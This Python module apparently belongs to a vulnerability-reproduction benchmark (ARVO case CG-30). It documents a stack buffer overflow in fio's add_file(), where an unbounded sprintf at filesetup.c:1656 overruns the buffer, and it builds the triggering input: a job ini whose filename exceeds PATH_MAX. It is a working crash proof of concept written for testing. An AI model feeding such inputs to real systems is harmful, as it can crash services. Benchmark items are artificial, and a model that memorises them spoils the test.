"""CG-30（arvo:29633 / fio）filename 超长导致 add_file 栈溢出。

**缺陷**：fio/filesetup.c 的 add_file()：

    char file_name[PATH_MAX];          /* PATH_MAX = 4096 */
    ...
    sprintf(file_name + len, "%s", fname);   /* 第 1656 行，不设长度上限 */

fname 来自 ini 里的 filename 选项（options.c:1320 str_filename_cb -> add_file），
长度不受限，超过 PATH_MAX 就直接写穿栈缓冲。官方栈：
    vsprintf <- __sprintf_chk <- add_file filesetup.c:1656 <- str_filename_cb options.c:1320
    <- __handle_option parse.c:792 <- ... <- __parse_jobs_ini init.c:2076

**输入形态**：fio 的 job ini 文本，一行 filename=<超长路径>，长度 > 4095 即可。
"""
from __future__ import annotations

PATH_MAX = 4096

FIELDS = {
    "name_len": "int(4096..200000), filename 的字符数（默认 6000）",
    "prefix": "str, 路径前缀（默认 /tmp/fio_)",
    "section": "str, ini 段头（默认 [global]）",
    "extra": "str, 附加的 ini 行（默认空）",
}

DECLARED_SINK = {
    "file": "filesetup.c",
    "line": 1656,
    "symbol": "sprintf",
    "note": "sprintf(file_name + len, \"%s\", fname) 未限长，file_name 只有 PATH_MAX(4096)",
}


class MaxPathResult:
    def __init__(self, ok, data=b"", fields_used=None, dropped=None, reason=""):
        self.ok = ok
        self.data = data
        self.format = "maxpath"
        self.fields_used = dict(fields_used or {})
        self.dropped = list(dropped or [])
        self.reason = reason

    @property
    def size(self) -> int:
        return len(self.data)

    def to_record(self) -> dict:
        return {"ok": self.ok, "format": self.format, "size": self.size,
                "fields_used": self.fields_used, "dropped_fields": self.dropped,
                "reason": self.reason}


def build(fields: dict) -> MaxPathResult:
    fields = dict(fields or {})
    try:
        name_len = int(fields.get("name_len", 6000))
    except (TypeError, ValueError):
        return MaxPathResult(False, reason="name_len 必须是整数")
    if not PATH_MAX <= name_len <= 200000:
        return MaxPathResult(False, reason="name_len 越界（%d..200000）: %d" % (PATH_MAX, name_len))
    prefix = str(fields.get("prefix") or "/tmp/fio_")
    if not prefix.startswith("/"):
        return MaxPathResult(False, reason="prefix 必须以 / 开头: %r" % prefix)
    section = str(fields.get("section") or "[global]")
    extra = str(fields.get("extra") or "")

    name = prefix + "A" * max(1, name_len - len(prefix))
    lines = [section, "filename=" + name]
    if extra:
        lines.append(extra)
    text = "\n".join(lines) + "\n"
    used = {"name_len": len(name), "prefix": prefix, "section": section,
            "bytes": len(text), "path_max": PATH_MAX}
    known = set(FIELDS)
    dropped = [{"field": k, "reason": "maxpath 构造器不识别该字段"}
               for k in fields if k not in known]
    return MaxPathResult(True, text.encode(), used, dropped, "")


def declared_claim() -> dict:
    """构造器自带主张：filename 超过 PATH_MAX，sprintf 写穿 add_file 的栈缓冲。"""
    return {
        "claim_id": "cg30-fio-filename-maxpath",
        "subject": "add_file",
        "proposed_by": "builder",
        "subject_source": "builder",
        "evidence_source": "agent/builders/maxpath.py + arvo error.txt",
        "cwe": "CWE-121",
        "sink": dict(DECLARED_SINK),
        "test_plan": {"format": "maxpath"},
    }


def fields_spec() -> dict:
    return dict(FIELDS)


if __name__ == "__main__":
    r = build({})
    assert r.ok, r.reason
    text = r.data.decode()
    assert text.startswith("[global]\nfilename=/tmp/fio_")
    assert text.endswith("\n")
    assert r.fields_used["name_len"] == 6000
    assert r.fields_used["name_len"] > PATH_MAX
    assert not build({"name_len": 4095}).ok
    assert not build({"name_len": "long"}).ok
    assert not build({"prefix": "relative"}).ok
    assert build({"unknown": 1}).dropped
    c = declared_claim()
    assert c["subject"] == "add_file" and c["sink"]["line"] == 1656
    print("maxpath builder self-check OK:", r.to_record())
